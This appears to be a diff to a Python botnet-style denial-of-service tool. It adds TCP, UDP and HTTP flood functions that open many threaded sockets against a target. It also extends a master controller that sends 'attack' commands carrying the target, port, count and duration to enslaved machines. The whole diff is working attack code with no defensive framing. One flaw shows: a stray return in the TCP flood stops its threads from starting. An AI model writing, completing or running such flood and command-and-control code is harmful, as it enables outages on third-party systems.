@@ -1,10 +1,120 @@
 import time 
 import socket
+import random
 import threading
 from threading import Thread
 
+openSocks = []
+
 def Log(event) :
     return "[{}] {}".format(time.ctime(),event)
+
+def getTCPSocket() :
+    '''
+    Function to create TCP socket
+    '''
+    return socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+def getUDPSocket() :
+    '''
+    Function to create UDP socket
+    '''
+    return socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+def close() :
+    for sock in openSocks :
+        try :
+            sock.close()
+        except OSError :
+            pass 
+        finally :
+            del sock
+
+def send(sock,target,port,duration,message,close=True) :
+    '''
+    Function to send command To Slave
+    '''
+    try :
+        openSocks.append(sock)
+        sock.settimeout(4)
+        sock.connect((target,port))
+        sock.send(message.encode())
+        time.sleep(duration) 
+        if close :
+            sock.close()
+    except socket.timeout:
+        pass
+    except Exception as e :
+        print(Log(f"Error {target} {port} {message} : {e}"))
+    
+    return
+
+def tcpAttack(target,port,count,duration) :
+    tcpThreads = []
+
+    # Create Thread for Each Port
+    for _ in range(count) :
+        socket = getTCPSocket()
+        tcpThreads.append(Thread(target=send,args=(socket,target,port,duration,' '*100)))
+    return
+    # Start Threads
+    for thread in tcpThreads :
+        thread.start()
+
+    # Join Threads
+    for thread in tcpThreads :
+        thread.join()
+
+    close()
+
+def udpAttack(target,port,count,duration) :
+    udpThreads = []
+
+    # Create Thread for Each Port
+    for _ in range(count) :
+        socket = getUDPSocket()
+        udpThreads.append(Thread(target=send,args=(socket,target,port,duration,' '*100)))
+    
+    # Start Threads
+    for thread in udpThreads :
+        thread.start()
+
+    # Join Threads
+    for thread in udpThreads :
+        thread.join()
+
+    close()
+
+def getMessage(message):
+        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000))))
+
+def httpAttack(target,port,count,duration) :
+    tcpThreads = []
+
+    headers = [
+            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
+            "Accept-Language: en-us,en;q=0.5",
+            ''
+        ]
+
+    message = getMessage('GET /?')
+    message += '\r\n'.join(headers)
+
+    # Create Thread for Each Port
+    for _ in range(count) :
+        socket = getTCPSocket()
+        tcpThreads.append(Thread(target=send,args=(socket,target,port,duration,message)))
+    
+    # Start Threads
+    for thread in tcpThreads :
+        thread.start()
+
+    # Join Threads
+    for thread in tcpThreads :
+        thread.join()
+
+    close()
+
 
 class Server :
     def __init__(self,addr=('0.0.0.0',10000)) :
@@ -97,7 +207,7 @@ class Master :
         port = self.bPort
         threads = []
         for i in range(len(self.slaves)) :
-            sock = self.getSocket()
+            sock = getTCPSocket()
             slave = self.slaves[i]
             t = Thread(target=self.upCheck,args=(sock,slave,))
             t.start()
@@ -113,7 +223,7 @@ class Master :
         print(self.up)
         threads = []
         for slave in self.up :
-            sock = self.getSocket()
+            sock = getTCPSocket()
             t = Thread(target=self.send,args=(sock,slave,'kill',))
             t.start()
             threads.append(t)
@@ -153,21 +263,16 @@ class Master :
         except Exception as e :
             print(Log(f"Error {slave} {port} {message} : {e}"))
     
-    def attack(self,target,port,count,aType,slaves) :
+    def attack(self,target,port,count,duration,aType,slaves) :
         '''
         Function to start Attack
         '''
         threads = []
         for slave in self.up[:slaves] :
-            sock = self.getSocket()
-            t = Thread(target=self.send,args=(sock,slave,f'attack:{target}:{port}:{count}:{aType}'))
+            sock = getTCPSocket()
+            t = Thread(target=self.send,args=(sock,slave,f'attack:{target}:{port}:{count}:{duration}:{aType}'))
             t.start()
             threads.append(t)
         for thread in threads :
             thread.join()
         
-    def getSocket(self) :
-        '''
-        Function to create socket
-        '''
-        return socket.socket(socket.AF_INET,socket.SOCK_STREAM)
